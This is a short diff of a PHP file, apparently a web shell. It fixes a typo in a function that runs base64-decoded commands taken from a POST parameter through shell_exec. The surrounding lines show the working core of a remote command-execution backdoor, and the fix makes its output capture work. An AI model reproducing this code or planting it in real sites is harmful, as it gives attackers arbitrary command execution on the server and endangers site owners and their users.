@@ -17,7 +17,7 @@ function runCommand()
 	$out=shell_exec(base64_decode($_POST['c']));
 	if(is_null($out))
 	{
-		$out = ob_getcontents();
+		$out = ob_get_contents();
 	}
 	ob_end_clean();
 	// HTML Escaping with htmlentities
